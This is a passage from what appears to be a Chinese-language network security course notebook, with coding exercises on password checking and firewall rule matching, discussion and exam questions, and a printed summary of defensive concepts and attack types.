    1. 检查是否包含用户名
    2. 检查是否在常见密码列表中
    3. 检查长度、字符类型等
    4. 返回评级和建议
    """
    issues = []  # 收集发现的问题
    score = 0    # 总分
    
    # TODO: 在这里编写你的代码
    # 提示：
    # - 如果 username 不为空，检查 password 中是否包含 username
    # - 检查 password.lower() 是否在 COMMON_PASSWORDS 中
    # - 检查长度（>=8 得1分，>=12 得2分，>=16 得3分）
    # - 检查是否包含大写、小写、数字、特殊字符（各1分）
    
    pass  # 删除此行，替换为你的代码

# 测试你的函数
# enhanced_password_check('admin123', 'admin')
# enhanced_password_check('MyStr0ng!P@ss', 'alice')

print("请完成上面的 enhanced_password_check 函数！")
print("完成后取消注释测试代码来验证你的实现。")

In [ ]:
# === 练习3b: 编写防火墙规则匹配系统 ===
#
# 要求：
# 给定以下防火墙规则集，编写函数判断数据包是否被允许
# 支持 CIDR 网段匹配（如 192.168.1.0/24）

def ip_in_network(ip, network):
    """
    检查IP是否在指定的网段内
    
    参数:
        ip: 如 '192.168.1.50'
        network: 如 '192.168.1.0/24' 或 '*'(任意) 或具体IP
    
    返回: True/False
    
    提示：
    - 如果 network 是 '*'，返回 True
    - 如果 network 包含 '/'，需要检查网段
    - CIDR /24 表示前24位（3个八位组）相同
    - 可以将IP拆分为4个数字来比较
    """
    # TODO: 在这里编写你的代码
    pass

def check_firewall_rules(packet, rules):
    """
    检查数据包是否通过防火墙
    
    参数:
        packet: {'src_ip': ..., 'dst_ip': ..., 'dst_port': ..., 'protocol': ...}
        rules: [{'action': ..., 'src': ..., 'dst': ..., 'port': ..., 'proto': ...}, ...]
    
    返回: 'ALLOW' 或 'DENY'
    """
    # TODO: 在这里编写你的代码
    # 按规则顺序匹配，返回第一个匹配规则的 action
    # 如果没有匹配的规则，默认返回 'DENY'
    pass

# 测试规则集
test_rules = [
    {'action': 'ALLOW', 'src': '192.168.1.0/24', 'dst': '*', 'port': 80, 'proto': 'TCP'},
    {'action': 'ALLOW', 'src': '192.168.1.0/24', 'dst': '*', 'port': 443, 'proto': 'TCP'},
    {'action': 'DENY',  'src': '*', 'dst': '*', 'port': 22, 'proto': 'TCP'},
    {'action': 'ALLOW', 'src': '10.0.0.0/8', 'dst': '*', 'port': '*', 'proto': '*'},
]

# 测试数据包
test_pkts = [
    {'src_ip': '192.168.1.50', 'dst_ip': '8.8.8.8', 'dst_port': 80, 'protocol': 'TCP'},
    {'src_ip': '172.16.0.1', 'dst_ip': '10.0.0.1', 'dst_port': 22, 'protocol': 'TCP'},
    {'src_ip': '10.0.0.5', 'dst_ip': '8.8.8.8', 'dst_port': 53, 'protocol': 'UDP'},
]

print("请完成 ip_in_network 和 check_firewall_rules 函数！")
print("\n预期输出：")
print("  包1 (192.168.1.50 -> 8.8.8.8:80 TCP): ALLOW")
print("  包2 (172.16.0.1 -> 10.0.0.1:22 TCP): DENY")
print("  包3 (10.0.0.5 -> 8.8.8.8:53 UDP): ALLOW")

### 练习4：讨论题

**Q8.** (8分) 一家中型公司计划升级其网络安全架构。目前该公司只有一个基本的包过滤防火墙。

请你作为安全顾问，为该公司设计一套纵深防御方案，需要包括：
- (a) 推荐的防火墙类型及部署位置 (2分)
- (b) IDS/IPS 的部署建议 (2分)
- (c) 网络分段建议 (2分)
- (d) 安全管理策略 (2分)

**Q9.** (6分) 讨论量子计算对当前加密体系的威胁：
- (a) 哪些加密算法最容易受到量子计算的影响？为什么？(2分)
- (b) 解释 Harvest Now, Decrypt Later 攻击策略 (2分)
- (c) 组织应该如何为量子计算时代做准备？(2分)

---

### 练习5：考试预测题

**Q10.** 一个用户收到一封看似来自银行的邮件，要求点击链接更新账户信息。
- (a) 识别这种攻击类型 (1分)
- (b) 说明该攻击利用了社会工程学中的什么心理因素 (2分)
- (c) 用户应该如何验证这封邮件的真实性？(2分)

**Q11.** 比较代理防火墙 (Proxy Firewall) 和包过滤防火墙的性能和安全性。
在什么场景下应该选择代理防火墙？(4分)

**Q12.** 一个公司网络中发现了异常流量。IDS报告了多个警报，但安全团队发现其中80%是误报。
- (a) 该IDS最可能使用的是哪种检测方法？解释你的理由。(2分)
- (b) 提出两种减少误报的方法。(2分)

In [ ]:
# === 最终总结：本节核心知识点一览 ===

print("=" * 60)
print("  第三节 网络安全与防御 - 核心知识点总结")
print("=" * 60)

topics = {
    "1. 防火墙 (Firewall)": [
        "包过滤 - 检查头部，速度快，安全性低",
        "状态检测 - 追踪连接状态，安全性中等",
        "应用层网关 - 代理模式，深度检查，安全性最高",
    ],
    "2. IDS/IPS": [
        "IDS: 只检测报警 | IPS: 检测+自动阻止",
        "签名检测: 匹配已知攻击，精确但无法检测零日攻击",
        "异常检测: 检测偏离基线行为，能发现未知攻击但误报高",
    ],
    "3. 网络攻击": [
        "DDoS: 僵尸网络发起的流量洪水攻击",
        "MITM: 截获双方通信的中间人攻击",
        "SQL注入: 在输入中嵌入恶意SQL代码",
        "XSS: 在网页中注入恶意JavaScript",
        "钓鱼: 利用社会工程学骗取信息",
        "暴力破解: 系统性尝试所有密码组合",
    ],
    "4. 恶意软件 (Malware)": [
        "Virus: 需宿主，用户触发传播",
        "Worm: 独立运行，自动网络传播",
        "Trojan: 伪装成正常软件",
        "Ransomware: 加密文件索要赎金",
        "Rootkit: 深层隐藏，极难检测",
        "Spyware: 秘密监控窃取信息",
        "Adware: 强制显示广告",
    ],
    "5. 防御策略": [
        "纵深防御: 物理->网络->主机->应用->数据",
        "安全策略: AUP, 密码策略, 事件响应",
        "网络分段: DMZ, 子网隔离",
    ],
    "6. 量子计算威胁": [
        "Shor算法: 可在多项式时间内分解大数",
        "RSA/ECC 将被完全破解",
        "AES-256 仍然安全（密钥长度等效减半）",
        "后量子密码学 (PQC) 正在标准化中",
    ],
}

for topic, points in topics.items():
    print(f"\n{topic}")
    print("-" * 50)
    for p in points:
        print(f"  * {p}")

print("\n" + "=" * 60)
print("  祝你学习顺利，考试加油！")
print("=" * 60)